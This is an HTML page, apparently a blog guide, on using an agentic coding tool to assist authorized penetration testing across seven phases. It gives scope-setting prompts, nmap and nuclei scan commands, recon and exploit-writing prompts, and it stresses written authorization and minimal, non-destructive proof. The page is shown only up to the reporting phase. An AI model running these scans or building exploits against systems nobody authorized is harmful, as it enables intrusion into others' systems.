@@ -1,0 +1,859 @@
+<!doctype html><html class="cache-narrow" lang=en><head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4E4BE1S6R6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-4E4BE1S6R6');
+</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Penetration Testing with Claude Code &mdash; cache</title><link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2032%2032%27%20fill%3D%27none%27%20stroke%3D%27%23357BB3%27%20stroke-width%3D%272.4%27%20stroke-linecap%3D%27round%27%20stroke-linejoin%3D%27round%27%3E%3Ccircle%20cx%3D%2711%27%20cy%3D%2711%27%20r%3D%275.5%27/%3E%3Cpath%20d%3D%27M15%2015%2026%2026%27/%3E%3Cpath%20d%3D%27M22%2022%2025%2019%27/%3E%3Cpath%20d%3D%27M25%2025%2028%2022%27/%3E%3C/svg%3E"><style>
+:root{--bg:#fbfaf7;--ink:#1c1b19;--mut:#6f6a62;--ac:#357BB3;--acbg:#eaf1f7;
+--line:#e6e1d8;--tile:#f5f2ec;--warn:#b4453a;--warnbg:#fbeeec;--ok:#2f8f5b;--term:#1b2733;
+--serif:'Iowan Old Style','Palatino Linotype',Palatino,Georgia,'Times New Roman',serif;
+--sans:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,system-ui,sans-serif}
+*{box-sizing:border-box}
+html{scrollbar-gutter:stable}
+body{margin:0;background:var(--bg);color:var(--ink);font:17px/1.7 var(--serif);
+-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility}
+.wrap{max-width:900px;margin:0 auto;padding:20px 22px 64px}
+p{margin:0 0 1em}em{font-style:italic}a{color:var(--ac)}
+ul,ol{padding-left:1.2em}li{margin:.35em 0}
+.mut{font-family:var(--sans);color:var(--mut);font-size:13.5px;line-height:1.55}
+code{background:#f0ede5;padding:2px 6px;border-radius:4px;font-size:14px;
+font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+.kick{font-family:var(--sans);color:var(--ac);letter-spacing:.14em;text-transform:uppercase;
+font-size:12px;font-weight:700}
+header{padding:34px 0 22px;margin-bottom:8px;border-bottom:2px solid var(--ink)}
+header h1{font-size:clamp(26px,3.6vw,38px);line-height:1.12;letter-spacing:-.015em;
+margin:.2em 0 .3em;font-weight:700}
+.dek{font-size:18px;line-height:1.5;color:#3a3833;margin:0 0 18px}
+.dek b{color:var(--ac)}
+.byline{font-family:var(--sans);font-size:13.5px;color:var(--mut)}
+.byline a{color:var(--ac)}
+section{margin:36px 0;padding:0}
+h2{font-size:23px;line-height:1.25;font-weight:700;letter-spacing:-.01em;margin:0 0 .5em}
+h2 .n{font-family:var(--sans);font-size:14px;font-weight:700;color:#fff;background:var(--ac);
+border-radius:50%;width:28px;height:28px;display:inline-flex;align-items:center;justify-content:center;
+vertical-align:middle;margin-right:10px}
+h3{font-size:18px;font-weight:700;margin:1.6em 0 .4em;letter-spacing:-.01em}
+/* callouts */
+.note{background:var(--acbg);border-left:3px solid var(--ac);border-radius:0 6px 6px 0;
+padding:13px 18px;margin:18px 0;font-size:15.5px;line-height:1.6;font-family:var(--sans)}
+.note b{color:var(--ac)}
+.warn{background:var(--warnbg);border-left:3px solid var(--warn);border-radius:0 6px 6px 0;
+padding:13px 18px;margin:18px 0;font-size:15.5px;line-height:1.6;font-family:var(--sans)}
+.warn b{color:var(--warn)}
+.warn .h{display:block;font-weight:700;color:var(--warn);text-transform:uppercase;
+letter-spacing:.05em;font-size:12px;margin-bottom:4px}
+/* stat row */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:16px;margin:22px 0}
+.stat{text-align:center}
+.stat b{display:block;font-size:30px;color:var(--ac);font-weight:700;line-height:1}
+.stat small{font-family:var(--sans);color:var(--mut);font-size:12.5px;display:block;margin-top:7px;line-height:1.4}
+/* capability matrix */
+table{width:100%;border-collapse:collapse;font-family:var(--sans);font-size:14px;margin:16px 0}
+th,td{padding:10px 8px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top}
+th{color:var(--mut);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.04em;
+border-bottom:1.5px solid var(--ink)}
+.cap tr:hover td{background:var(--tile)}
+.pill{display:inline-block;font-family:var(--sans);font-size:11px;font-weight:700;
+border-radius:20px;padding:2px 10px;white-space:nowrap}
+.p-vhigh{background:#e7f3ec;color:#1f6f47}.p-high{background:#eaf1f7;color:#2c6196}
+.p-med{background:#fbf3e3;color:#9a6a13}.p-low{background:#f3ece9;color:#8a4b41}
+/* phase stepper */
+.stepper{background:var(--tile);border:1px solid var(--line);border-radius:12px;padding:16px 16px 4px;margin:20px 0}
+.pbar{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:6px}
+.pbtn{flex:1 1 auto;min-width:96px;font-family:var(--sans);font-size:12.5px;font-weight:600;cursor:pointer;
+background:#fff;color:var(--mut);border:1px solid var(--line);border-radius:9px;padding:9px 8px;
+text-align:center;transition:all .15s;line-height:1.25}
+.pbtn .pn{display:block;font-size:10px;letter-spacing:.06em;text-transform:uppercase;opacity:.7}
+.pbtn:hover{border-color:var(--ac);color:var(--ink)}
+.pbtn.on{background:var(--ac);color:#fff;border-color:var(--ac)}
+.pbtn.on .pn{opacity:.85}
+.ppanel{display:none;padding:14px 4px 10px;font-family:var(--sans);font-size:14.5px;line-height:1.6;animation:fade .25s ease}
+.ppanel.on{display:block}
+@keyframes fade{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+.ppanel h4{font-family:var(--sans);font-size:16px;margin:0 0 2px;color:var(--ink)}
+.ppanel .goal{color:var(--mut);font-size:13.5px;margin:0 0 12px}
+.ppanel .lbl{font-family:var(--sans);font-weight:700;font-size:11px;text-transform:uppercase;
+letter-spacing:.05em;color:var(--ac);margin:14px 0 5px}
+.ppanel ul{margin:.2em 0 .6em;padding-left:1.15em}.ppanel li{margin:.28em 0}
+/* code / terminal / prompt blocks */
+.term,.prompt{position:relative;border-radius:9px;margin:10px 0;overflow:hidden;border:1px solid var(--line)}
+.term{background:var(--term)}
+.term pre,.prompt pre{margin:0;padding:14px 15px;overflow-x:auto;font-size:13px;line-height:1.55;
+font-family:ui-monospace,SFMono-Regular,Menlo,monospace;white-space:pre-wrap;word-break:break-word}
+.term pre{color:#d6e2ec}.term .cmt{color:#6f8ba0}.term .cmd{color:#7fd3a3}
+.prompt{background:#f3f1ea}.prompt pre{color:#2a3b47}
+.blk-h{display:flex;align-items:center;gap:8px;padding:7px 12px;font-family:var(--sans);
+font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.05em}
+.term .blk-h{background:#12202c;color:#8fb0c6}.prompt .blk-h{background:#e8e3d8;color:var(--mut)}
+.blk-h .dot{width:9px;height:9px;border-radius:50%;background:#e2544a}
+.blk-h .dot+.dot{background:#e6b53c}.blk-h .dot+.dot+.dot{background:#4caf6b}
+.copy{margin-left:auto;cursor:pointer;border:0;border-radius:6px;padding:3px 10px;font-family:var(--sans);
+font-size:11px;font-weight:700;background:rgba(255,255,255,.14);color:inherit;transition:background .15s}
+.prompt .copy{background:rgba(0,0,0,.06)}
+.copy:hover{background:rgba(127,211,163,.28)}.prompt .copy:hover{background:rgba(53,123,179,.16)}
+.copy.done{background:var(--ok);color:#fff}
+/* prompt library cards */
+details.card{background:var(--tile);border:1px solid var(--line);border-radius:10px;margin:10px 0;overflow:hidden}
+details.card>summary{list-style:none;cursor:pointer;display:flex;align-items:center;gap:11px;user-select:none;
+padding:13px 16px;transition:background .15s;font-family:var(--sans)}
+details.card>summary:hover{background:#efeae0}
+details.card>summary::-webkit-details-marker{display:none}
+details.card>summary::before{content:"\25B8";color:var(--ac);font-size:13px;transition:transform .15s}
+details.card[open]>summary::before{transform:rotate(90deg)}
+details.card>summary b{font-size:15px}
+details.card>summary .tag{margin-left:auto;font-family:var(--sans);font-size:10.5px;font-weight:700;
+text-transform:uppercase;letter-spacing:.04em;color:var(--ac);background:#fff;border:1px solid var(--line);
+border-radius:20px;padding:2px 9px}
+.card .body{padding:2px 16px 14px}
+/* checklist */
+.check{list-style:none;padding:0;margin:14px 0;font-family:var(--sans)}
+.check li{display:flex;gap:11px;align-items:flex-start;padding:10px 12px;border:1px solid var(--line);
+border-radius:8px;margin:7px 0;background:var(--tile);font-size:14px;line-height:1.5;cursor:pointer;transition:all .15s}
+.check li:hover{border-color:var(--ac)}
+.check input{margin-top:3px;width:16px;height:16px;accent-color:var(--ac);cursor:pointer;flex:none}
+.check li.done{opacity:.55;background:#eef4ef;border-color:#cfe3d6}
+.check li.done span{text-decoration:line-through}
+.check .k{font-weight:700}
+/* pipeline diagram */
+.flow{display:flex;align-items:stretch;gap:0;flex-wrap:wrap;margin:18px 0;font-family:var(--sans)}
+.flow .node{flex:1 1 90px;text-align:center;background:var(--tile);border:1px solid var(--line);
+border-radius:8px;padding:10px 6px;font-size:12px;font-weight:600;position:relative;min-width:88px}
+.flow .node small{display:block;color:var(--mut);font-size:10px;font-weight:400;margin-top:2px}
+.flow .arw{display:flex;align-items:center;color:var(--ac);font-weight:700;padding:0 3px}
+.divider{text-align:center;margin:60px 0 12px}
+.divider span{font-family:var(--sans);color:var(--ac);letter-spacing:.16em;text-transform:uppercase;
+font-size:12px;font-weight:700}
+.divider:after{content:"";display:block;width:56px;height:2px;background:var(--ac);margin:14px auto 0}
+footer{margin-top:54px;padding-top:22px;border-top:1px solid var(--line);
+font-family:var(--sans);color:var(--mut);font-size:13px;line-height:1.6}
+@media(max-width:600px){
+body{font-size:16px}.wrap{padding:16px 14px 50px}.stats{grid-template-columns:1fr 1fr}
+.pbtn{min-width:72px;font-size:11.5px}.flow .arw{display:none}.flow .node{flex-basis:44%}
+}
+</style><link rel="stylesheet" type="text/css" href="../../assets/css/reading-theme.css">
+<meta property="og:title" content="Penetration Testing with Claude Code">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="cache">
+<meta property="og:url" content="https://cache.bwang.io/reading/klefki/index.html">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Penetration Testing with Claude Code &mdash; cache">
+</head><body>
+<style>@font-face{font-family:'Josefin Sans';font-style:normal;font-weight:400;src:url('../../assets/fonts/inside/josefin-sans-v15-latin-regular.woff2') format('woff2');}@font-face{font-family:'Josefin Sans';font-style:normal;font-weight:600;src:url('../../assets/fonts/inside/josefin-sans-v15-latin-600.woff2') format('woff2');}@keyframes cacheFadeIn{from{opacity:0;}to{opacity:1;}}body{animation:cacheFadeIn .4s ease both;}</style><style>
+@view-transition{navigation:auto;}
+.nav-float{position:fixed;top:22px;left:22px;z-index:2147483647;pointer-events:none;
+	font:400 14px/1.45 'Josefin Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;}
+.nav-min-cb{position:absolute;width:0;height:0;opacity:0;pointer-events:none;}
+.nav-card{width:230px;max-height:calc(100vh - 44px);overflow-y:auto;
+	background:rgba(255,255,255,.82);-webkit-backdrop-filter:blur(14px) saturate(1.5);
+	backdrop-filter:blur(14px) saturate(1.5);border:1px solid rgba(140,140,140,.16);
+	border-radius:13px;padding:14px 0 16px;pointer-events:auto;transform-origin:top left;
+	transition:opacity .24s ease,transform .24s ease;}
+.nav-head{display:flex;align-items:center;justify-content:space-between;padding:0 16px 8px;}
+.nav-home{display:inline-flex;align-items:center;color:#9a9a9a;text-decoration:none;
+	padding:2px;transition:color .15s;}
+.nav-home:hover{color:#333;}
+.nav-mini{cursor:pointer;color:#c4c4c4;font-size:21px;line-height:.5;padding:0 3px 6px;
+	user-select:none;transition:color .15s;}
+.nav-mini:hover{color:#333;}
+.nav-restore{position:absolute;top:0;left:0;display:inline-flex;align-items:center;gap:8px;
+	cursor:pointer;background:rgba(255,255,255,.82);-webkit-backdrop-filter:blur(14px) saturate(1.5);
+	backdrop-filter:blur(14px) saturate(1.5);border:1px solid rgba(140,140,140,.2);
+	color:#555;border-radius:11px;padding:8px 14px;font-size:13px;user-select:none;
+	opacity:0;pointer-events:none;transition:opacity .2s ease;}
+.nav-restore::before{content:"";width:15px;height:11px;flex:none;color:#888;
+	background:linear-gradient(currentColor,currentColor) left top/100% 1.5px no-repeat,
+		linear-gradient(currentColor,currentColor) left center/100% 1.5px no-repeat,
+		linear-gradient(currentColor,currentColor) left bottom/100% 1.5px no-repeat;}
+.nav-restore:hover{color:#111;}
+.nav-min-cb:checked ~ .nav-card{opacity:0;transform:scale(.96) translateY(-6px);pointer-events:none;}
+.nav-min-cb:checked ~ .nav-restore{opacity:1;pointer-events:auto;}
+.nav-card a.item{display:block;padding:7px 20px;color:#333;text-decoration:none;
+	white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.nav-card a.item:hover{background:#f6f6f6;color:#111;}
+.nav-card a.item.active{color:#357BB3;font-weight:600;box-shadow:inset 2px 0 0 #357BB3;}
+.nav-radio{position:absolute;opacity:0;pointer-events:none;}
+.nav-toggle{display:flex;flex-wrap:wrap;gap:.5rem .9rem;margin:0 20px 12px;}
+.nav-toggle label{font-size:13px;font-weight:600;color:#c4c4c4;cursor:pointer;
+	padding:0 0 5px;border-bottom:2px solid transparent;user-select:none;}
+.nav-card #nav-cache:checked ~ .nav-toggle label[for=nav-cache],
+.nav-card #nav-reading:checked ~ .nav-toggle label[for=nav-reading],
+.nav-card #nav-standalone:checked ~ .nav-toggle label[for=nav-standalone]{
+	color:#111;border-bottom-color:#357BB3;}
+.nav-feed{display:none;}
+.nav-card #nav-cache:checked ~ .nf-cache{display:block;}
+.nav-card #nav-reading:checked ~ .nf-reading{display:block;}
+.nav-card #nav-standalone:checked ~ .nf-standalone{display:block;}
+@media (max-width:1330px){
+	.nav-card{opacity:0;transform:scale(.96) translateY(-6px);pointer-events:none;}
+	.nav-restore{opacity:1;pointer-events:auto;}
+	.nav-min-cb:checked ~ .nav-card{opacity:1;transform:none;pointer-events:auto;}
+	.nav-min-cb:checked ~ .nav-restore{opacity:0;pointer-events:none;}
+}
+@media (max-width:700px){.nav-card{width:min(230px,calc(100vw - 36px));}}
+@media (prefers-reduced-motion: reduce){.nav-card,.nav-restore{transition:none;}}
+</style><div class="nav-float"><input type="checkbox" id="nav-min" class="nav-min-cb" aria-label="Minimize post list"><label class="nav-restore" for="nav-min" title="Show posts">posts</label><div class="nav-card"><div class="nav-head"><a class="nav-home" href="../../index.html" title="Home" aria-label="Home"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 11.5 12 4l9 7.5"/><path d="M5.5 10v9.5h13V10"/></svg></a><label class="nav-mini" for="nav-min" title="Minimize" aria-label="Minimize">–</label></div><input type="radio" name="nav-feed" id="nav-cache" class="nav-radio"><input type="radio" name="nav-feed" id="nav-reading" class="nav-radio" checked><input type="radio" name="nav-feed" id="nav-standalone" class="nav-radio"><div class="nav-toggle"><label for="nav-cache">cache</label><label for="nav-reading">reading</label><label for="nav-standalone">standalone</label></div><div class="nav-feed nf-cache"><a class="item" href="../../token-playbook.html">Token Playbook</a><a class="item" href="../../some-projects.html">Some Projects</a><a class="item" href="../../practical-poker.html">Practical Poker</a><a class="item" href="../../ecom-experiments.html">Ecom Experiments</a><a class="item" href="../../why-crypto.html">Why Crypto</a><a class="item" href="../../growing-peppers.html">Growing Peppers</a><a class="item" href="../../book-reviews.html">Book Reviews</a><a class="item" href="../../wasted-time.html">Dumb Poker</a><a class="item" href="../../trading-automation.html">Trading Automation</a><a class="item" href="../../api-in-rust.html">API in Rust</a><a class="item" href="../../cicd-on-gcp.html">CI/CD on GCP + SQL</a><a class="item" href="../../nomad-and-waypoint.html">Nomad &amp; Waypoint</a></div><div class="nav-feed nf-reading"><a class="item" href="../poker-pros/index.html">High Roller Ledger</a><a class="item" href="../spacs/index.html">Understanding SPACs</a><a class="item" href="../ipos-spacex/index.html">Will the SpaceX IPO Beat the Market?</a><a class="item" href="../making-an-iphone/index.html">Anatomy of an iPhone</a><a class="item" href="../world-cup-2026/index.html">Who Will Win the 2026 World Cup?</a><a class="item" href="../watches/index.html">Watches That Beat Retail</a><a class="item" href="../wine/index.html">Wine as an Investment Asset</a><a class="item" href="../real-estate/index.html">What Predicts US Real-Estate Returns?</a><a class="item" href="../ncaa/index.html">Predicting March Madness 2026</a><a class="item active" href="../klefki/index.html">Penetration Testing with Claude Code</a></div><div class="nav-feed nf-standalone"><a class="item ext" href="https://www.bwang.io/muk/" target="_blank" rel="noopener">Energy Trading Primer <span aria-hidden="true">↗</span></a><a class="item ext" href="https://www.bwang.io/ekans/" target="_blank" rel="noopener">Trading Signals <span aria-hidden="true">↗</span></a><a class="item ext" href="https://stonks.bwang.io/" target="_blank" rel="noopener">Stock Picker <span aria-hidden="true">↗</span></a><a class="item ext" href="https://arbitrage.bwang.io" target="_blank" rel="noopener">Arbitrage Finder <span aria-hidden="true">↗</span></a><a class="item ext" href="https://chansey.bwang.io" target="_blank" rel="noopener">Medical RAG <span aria-hidden="true">↗</span></a><a class="item ext" href="https://www.bwang.io/magikarp/" target="_blank" rel="noopener">Newsletter <span aria-hidden="true">↗</span></a></div></div></div>
+
+<div class=wrap>
+<header>
+<h1>Penetration testing with Claude Code</h1>
+<div class=kick>Security &middot; Codename Klefki</div>
+<p class=dek>An agentic coding CLI turns out to be a strong <b>security copilot</b>: it drives
+your scanners, reads source the way a reviewer does, writes proof-of-concept exploits, and
+drafts the report &mdash; all under a permission model you control. This is a field guide plus a
+seven-phase playbook for using it on engagements <b>you are authorized to run</b>.</p>
+<div class=byline>A study, July 17, 2026 &middot; for authorized testing, CTFs, and research only &middot; <a href="#play">jump to the playbook &darr;</a></div>
+</header>
+
+<div class=warn><span class=h>Read this first</span>
+Everything below assumes <b>written authorization</b> for the systems in scope &mdash; a signed
+engagement, a lab you own, or a sanctioned CTF. Running these techniques against systems you
+don't have permission to test is a crime in most jurisdictions. The legal responsibility is
+yours, not the tool's. Claude Code is built to <em>assist authorized security work and refuse
+malicious use</em>; treat that guardrail as a floor, not a substitute for your own scope.</div>
+
+<div class=stats>
+<div class=stat><b>7</b><small>phases, recon&nbsp;&rarr;&nbsp;report</small></div>
+<div class=stat><b>3</b><small>permission modes to gate risk</small></div>
+<div class=stat><b>∞</b><small>CLI tools it can orchestrate</small></div>
+<div class=stat><b>1</b><small>built-in <code>/security-review</code></small></div>
+</div>
+
+<section><h2><span class=n>0</span>What Claude Code actually is, to a pentester</h2>
+<p>Strip away the "coding assistant" framing and Claude Code is a <b>terminal agent</b>: a model
+that can read files, run shell commands, search the web, edit code, and loop on the output of
+its own actions. That loop &mdash; observe, decide, run a tool, read the result, decide again &mdash; is
+exactly the shape of a penetration test. The difference from a human tester is throughput and
+recall; the difference from a scanner is judgment.</p>
+<p>Three of its native abilities map directly onto offensive work:</p>
+<ul>
+<li><b>It runs tooling and parses the output.</b> It can invoke <code>nmap</code>,
+<code>ffuf</code>, <code>nuclei</code>, <code>sqlmap</code>, <code>gobuster</code>, and hundreds
+of others, then turn a wall of noisy text into a prioritized table &mdash; the tedious middle of most
+engagements.</li>
+<li><b>It reads code like a reviewer.</b> Pointed at a source tree it traces user input from
+handler to sink, reasoning about injection, auth logic, and IDOR in a way pattern-based SAST
+can't. This is its single strongest security skill.</li>
+<li><b>It writes and iterates.</b> It drafts a Python proof-of-concept, runs it against a target
+you control, reads the traceback, and fixes it &mdash; the write/run/debug cycle, unattended.</li>
+</ul>
+<p>What keeps it safe to point at real systems is that every risky action runs through a
+<b>permission layer</b> you configure. Nothing touches a host without either your standing
+allow-list or an explicit approval. That layer is the whole reason this is usable on an
+engagement rather than a liability.</p>
+</section>
+
+<section><h2><span class=n>1</span>Where it's strong, and where it isn't</h2>
+<p>Suitability varies a lot by phase. The honest picture &mdash; strongest at reading code and writing
+reports, deliberately weakest at anything resembling autonomous, destructive, or out-of-scope
+action:</p>
+<table class=cap>
+<tr><th>Task</th><th>Fit</th><th>Why</th></tr>
+<tr><td><b>Code &amp; vuln analysis</b></td><td><span class="pill p-vhigh">Very high</span></td><td>Reading a tree and reasoning source&nbsp;&rarr;&nbsp;sink is its core competency; catches logic bugs scanners miss.</td></tr>
+<tr><td><b>Reporting</b></td><td><span class="pill p-vhigh">Very high</span></td><td>Consistent findings, CVSS, repro steps, remediation. The biggest raw time-saver of the whole engagement.</td></tr>
+<tr><td><b>Passive recon</b></td><td><span class="pill p-high">High</span></td><td>Orchestrates OSINT tools, dedupes, resolves, fingerprints, and summarizes an attack surface.</td></tr>
+<tr><td><b>Active scanning</b></td><td><span class="pill p-high">High</span></td><td>Drives scanners and, crucially, triages their output into what's worth a human's time.</td></tr>
+<tr><td><b>Exploitation</b></td><td><span class="pill p-med">Medium</span></td><td>Great at single-step PoCs; multi-stage chains still need a human to steer. <b>Verify every claim.</b></td></tr>
+<tr><td><b>Scoping &amp; ROE</b></td><td><span class="pill p-med">Medium</span></td><td>Reads and enforces a scope doc well, but authorization and boundaries are your responsibility.</td></tr>
+<tr><td><b>Post-exploitation</b></td><td><span class="pill p-low">Low&ndash;med</span></td><td>Intentionally constrained &mdash; it resists mass, persistent, or destructive actions by design.</td></tr>
+</table>
+<p class=mut>Rule of thumb: lean on it hardest for the reading and writing halves of the job (analysis,
+triage, reporting) and keep a firm hand on the acting half (exploitation, anything that changes
+state on a target).</p>
+</section>
+
+<div class=divider><span>The playbook</span></div>
+
+<section id=play><h2><span class=n>2</span>The engagement, phase by phase</h2>
+<p>A pentest is a pipeline. Below is the same pipeline with Claude Code slotted into each stage &mdash;
+its job, the tools it drives, and a copy-paste prompt to start from. Click a phase.</p>
+
+<div class=flow>
+<div class=node>Scope<small>authorize</small></div><div class=arw>&rarr;</div>
+<div class=node>Recon<small>passive</small></div><div class=arw>&rarr;</div>
+<div class=node>Enumerate<small>active</small></div><div class=arw>&rarr;</div>
+<div class=node>Analyze<small>find bugs</small></div><div class=arw>&rarr;</div>
+<div class=node>Exploit<small>prove it</small></div><div class=arw>&rarr;</div>
+<div class=node>Post-ex<small>impact</small></div><div class=arw>&rarr;</div>
+<div class=node>Report<small>write up</small></div>
+</div>
+
+<div class=stepper>
+<div class=pbar>
+<button class="pbtn on" data-p=0><span class=pn>Phase 0</span>Scope</button>
+<button class=pbtn data-p=1><span class=pn>Phase 1</span>Recon</button>
+<button class=pbtn data-p=2><span class=pn>Phase 2</span>Enumerate</button>
+<button class=pbtn data-p=3><span class=pn>Phase 3</span>Analyze</button>
+<button class=pbtn data-p=4><span class=pn>Phase 4</span>Exploit</button>
+<button class=pbtn data-p=5><span class=pn>Phase 5</span>Post-ex</button>
+<button class=pbtn data-p=6><span class=pn>Phase 6</span>Report</button>
+</div>
+
+<div class="ppanel on" data-p=0>
+<h4>Phase 0 &middot; Scope &amp; rules of engagement</h4>
+<p class=goal>Goal: make the assistant scope-aware before a single tool runs.</p>
+<p>Put the rules of engagement where Claude reads them every session &mdash; a <code>SCOPE.md</code> or
+the project's <code>CLAUDE.md</code>. Then harden the permission layer so out-of-scope or
+destructive commands can't run even by accident (see &sect;3). The model should be able to recite
+the in-scope ranges and refuse anything outside them.</p>
+<div class="lbl">Session bootstrap prompt</div>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>Rules of engagement for this session (also in SCOPE.md):
+- In scope:  *.acme-lab.example  and  10.10.0.0/24
+- Out of scope: everything else, especially prod-pay.acme.example
+- No denial-of-service, no destructive writes, no data exfiltration
+  beyond the minimum needed to prove a finding.
+Before running anything, confirm the target is in scope. If a task would
+touch anything out of scope, refuse and tell me why.</pre></div>
+<div class="lbl">What it produces</div>
+<p>A working context that self-checks scope, plus a paper trail: ask it to keep an engagement
+log (<code>notes.md</code>) of every command it runs and why. That log becomes your reporting
+appendix and your evidence of staying in bounds.</p>
+</div>
+
+<div class=ppanel data-p=1>
+<h4>Phase 1 &middot; Reconnaissance (passive)</h4>
+<p class=goal>Goal: map the attack surface without hammering the target.</p>
+<p>Claude chains passive OSINT tools and collapses the output into one deduplicated picture:
+subdomains, live hosts, technologies, and anything interesting leaking in public.</p>
+<ul>
+<li><b>Surface:</b> <code>subfinder</code>, <code>amass</code> (passive), certificate transparency via <code>crt.sh</code>.</li>
+<li><b>Resolve &amp; fingerprint:</b> <code>dnsx</code>, <code>httpx</code> (<code>-title -tech-detect -status-code</code>), <code>gowitness</code> for screenshots.</li>
+<li><b>Leaks:</b> <code>gitleaks</code>/<code>trufflehog</code> over cloned public repos; GitHub dorking via web search.</li>
+</ul>
+<div class="lbl">Prompt</div>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>We're authorized to test acme-lab.example (scope in SCOPE.md). Do PASSIVE
+recon only: enumerate subdomains with subfinder + amass passive sources,
+pull crt.sh, resolve live hosts with dnsx, then fingerprint with httpx
+(-title -tech-detect -status-code). Give me a deduped table of live hosts
+sorted by how interesting the tech stack is. Don't run active scanners yet.</pre></div>
+</div>
+
+<div class=ppanel data-p=2>
+<h4>Phase 2 &middot; Enumeration &amp; scanning (active)</h4>
+<p class=goal>Goal: active discovery of services, endpoints, and parameters &mdash; and triage.</p>
+<p>This is where Claude's parsing shines. Scanners emit walls of text; the model turns them into a
+ranked worklist and cross-references versions against known CVEs.</p>
+<ul>
+<li><b>Ports/services:</b> <code>nmap -sV -sC</code>, parse the XML into a table.</li>
+<li><b>Content &amp; params:</b> <code>ffuf</code>/<code>gobuster</code> for directories, <code>arjun</code> for hidden parameters, API spec parsing.</li>
+<li><b>Templated checks:</b> <code>nuclei</code> against the live set, then de-duplicate and prioritize.</li>
+</ul>
+<div class="lbl">Terminal + prompt</div>
+<div class=term><div class=blk-h><span class=dot></span><span class=dot></span><span class=dot></span>shell<button class=copy>Copy</button></div><pre><span class=cmt># Claude proposes, you approve, it runs and parses:</span>
+<span class=cmd>nmap -sV -sC -oX scan.xml -iL hosts.txt --top-ports 1000</span>
+<span class=cmd>nuclei -l live.txt -severity medium,high,critical -o nuclei.txt</span></pre></div>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>Run an nmap service/version scan on hosts.txt (top 1000 ports), parse
+scan.xml, and give me a table of open services with version -> any known
+CVEs (search to confirm the version is actually affected, don't guess).
+Flag anything unauthenticated or clearly outdated for follow-up.</pre></div>
+</div>
+
+<div class=ppanel data-p=3>
+<h4>Phase 3 &middot; Vulnerability analysis</h4>
+<p class=goal>Goal: turn surface into concrete, ranked hypotheses. This is the model's best phase.</p>
+<p>If you have source (white-box, or you pulled it), point Claude at the tree and let it read.
+It traces tainted input from every HTTP handler to dangerous sinks &mdash; SQL, shell, file paths,
+templates, deserialization &mdash; and reasons about auth and access-control logic that signature
+scanners walk right past. Pair it with <code>semgrep</code>, <code>trivy</code>, and a dependency
+audit so the deterministic tools catch the known patterns and the model catches the logic.</p>
+<div class="lbl">Prompt (white-box)</div>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>This is the source for the in-scope app. Act as an application-security
+reviewer. Trace user input from the HTTP handlers to any sink (SQL, shell,
+file path, template render, deserialization). List candidate issues with
+file:line, the tainted variable, the path from source to sink, and why it
+might be exploitable. Rank by confidence. Then run semgrep and reconcile
+its hits with yours.</pre></div>
+<p class=mut>Black-box? Same idea against behavior instead of code: feed it responses, headers, and
+error messages and ask it to hypothesize where auth, IDOR, or injection likely live, then design
+the tests to confirm.</p>
+</div>
+
+<div class=ppanel data-p=4>
+<h4>Phase 4 &middot; Exploitation (authorized PoC)</h4>
+<p class=goal>Goal: prove impact with the smallest possible demonstration &mdash; then stop.</p>
+<p>Claude writes the proof-of-concept and iterates it against a target you control: a Python
+<code>requests</code> script, a <code>curl</code> chain, a crafted payload. Confirm SQLi with
+<code>sqlmap</code>; replay and mutate requests through the <b>Burp Suite MCP server</b> so the
+model can drive an intercepting proxy directly. The discipline that matters here is
+<em>minimalism</em>: prove access, capture evidence, do not escalate for its own sake.</p>
+<div class="lbl">Prompt</div>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>/api/orders looks vulnerable to IDOR -- order_id isn't scoped to the
+session user. Write a minimal Python PoC (requests) that logs in as our
+test user A and reads test user B's order, printing only enough to prove
+cross-account access. Read-only, non-destructive, stop at proof. Save the
+request/response as evidence for the report.</pre></div>
+<div class=warn><span class=h>Verify everything</span>
+The model will occasionally report a vulnerability that isn't real, or a PoC that "works" against
+a mocked assumption. A finding isn't a finding until you've watched the exploit reproduce against
+the live target. Treat its confidence as a lead, never as proof.</div>
+</div>
+
+<div class=ppanel data-p=5>
+<h4>Phase 5 &middot; Post-exploitation (scoped)</h4>
+<p class=goal>Goal: demonstrate business impact within the rules of engagement &mdash; nothing more.</p>
+<p>Show the one pivot that proves why the finding matters &mdash; the privilege you gained, the data
+class you could reach &mdash; and collect evidence. This is deliberately the phase Claude is <em>least</em>
+eager to help with: it resists persistence, backdoors, mass credential harvesting, exfiltration,
+and detection-evasion, because those are the hallmarks of the malicious use it's built to refuse.
+For authorized work you generally don't want them either &mdash; a single clean impact demonstration
+beats a rampage through the environment, and keeps you inside scope.</p>
+<div class="lbl">Prompt</div>
+<div class=prompt><div class=blk-h>prompt<button class=copy>Copy</button></div><pre>We proved admin access on the staging box (in scope, per SCOPE.md). Help me
+document the impact WITHOUT persistence or lateral spread: enumerate what
+this role can reach, identify the single most business-critical asset it
+exposes, and capture proof for the report. No new accounts, no backdoors,
+no data pulled beyond a redacted screenshot.</pre></div>
+</div>
+
+<div class=ppanel data-p=6>
